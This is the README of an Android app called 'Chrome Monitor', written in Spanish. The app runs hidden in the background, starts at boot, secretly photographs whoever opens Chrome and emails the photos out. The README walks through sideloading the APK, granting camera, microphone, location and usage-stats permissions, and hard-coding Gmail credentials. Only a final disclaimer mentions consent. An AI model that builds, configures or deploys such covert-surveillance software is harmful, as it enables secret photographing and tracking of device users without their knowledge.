# Chrome Monitor 📱

Aplicación Android que monitorea el uso de Chrome y captura fotos automáticamente cuando está abierto.

## 🚀 Características

- **Monitoreo en segundo plano** de Chrome
- **Captura automática** de fotos cuando Chrome está activo
- **Envío por email** de las fotos capturadas
- **Inicio automático** al encender el dispositivo
- **Sin interfaz gráfica** - funciona completamente en background

## 📦 Descargar APK

### Opción 1: Releases Automáticos
Ve a la sección [Releases](../../releases) para descargar la última versión compilada automáticamente.

### Opción 2: GitHub Actions
1. Ve a la pestaña [Actions](../../actions)
2. Selecciona la última compilación exitosa
3. Descarga el artefacto "chrome-monitor-apk"

## 🔧 Instalación

### En tu teléfono Android:

1. **Activar instalación de fuentes desconocidas:**
   - Configuración > Seguridad > Fuentes desconocidas ✅
   - O en Android 8+: Configuración > Apps > Acceso especial > Instalar apps desconocidas

2. **Instalar el APK:**
   - Descarga el APK en tu teléfono
   - Abre desde el explorador de archivos
   - Acepta la instalación

3. **Configurar permisos (CRÍTICO):**
   ```
   Configuración > Apps > Chrome Monitor > Permisos:
   ✅ Cámara
   ✅ Almacenamiento
   ✅ Teléfono
   ✅ Micrófono
   ✅ Ubicación
   ```

4. **Accesos especiales:**
   ```
   Configuración > Apps > Acceso especial:
   ✅ Estadísticas de uso → Chrome Monitor
   ✅ Mostrar sobre otras apps → Chrome Monitor
   ✅ Administrar todas las apps → Chrome Monitor
   ```

## ⚙️ Configuración

### Antes de usar, configura tu email:

Edita el archivo `app/src/main/java/com/example/chromemonitor/EmailSender.java`:

```java
// Línea ~15
private static final String EMAIL = "tu_email@gmail.com";
private static final String PASSWORD = "tu_contraseña_de_app";  // NO tu contraseña normal
private static final String TO_EMAIL = "donde_recibir@gmail.com";
```

### Obtener contraseña de aplicación Gmail:
1. Ve a [myaccount.google.com](https://myaccount.google.com)
2. Seguridad > Verificación en 2 pasos
3. Contraseñas de aplicaciones
4. Genera nueva contraseña para "Chrome Monitor"

## 🧪 Prueba

1. Instala la app
2. Abre Chrome en tu teléfono
3. Espera 5-10 segundos
4. Revisa tu email - deberías recibir una foto

## 🛠️ Desarrollo

### Compilar localmente:

```bash
git clone https://github.com/Xire667/apk-chrome.git
cd apk-chrome
./gradlew assembleDebug
```

### Requisitos:
- Android SDK 30+
- Java 11+
- Gradle 7.6+

## 📱 Compatibilidad

- **Android 7.0+** (API 24+)
- **Permisos de cámara** requeridos
- **Acceso a estadísticas de uso** necesario
- **Chrome instalado** en el dispositivo

## 🔍 Solución de Problemas

### La app no funciona:
- ✅ Verifica que todos los permisos están activados
- ✅ Asegúrate de que Chrome esté instalado
- ✅ Configura correctamente el email
- ✅ Reinicia el teléfono después de instalar

### No recibo emails:
- ✅ Verifica la configuración de email
- ✅ Usa contraseña de aplicación, no contraseña normal
- ✅ Revisa la carpeta de spam
- ✅ Asegúrate de que hay conexión a internet

### Para debugging:
```bash
adb logcat | grep ChromeMonitor
```

## 📄 Licencia

Este proyecto es de código abierto. Úsalo bajo tu propia responsabilidad.

## ⚠️ Advertencia

Esta aplicación está diseñada para uso personal y educativo. Asegúrate de cumplir con las leyes locales de privacidad y obtener el consentimiento apropiado antes de usar en dispositivos que no sean tuyos.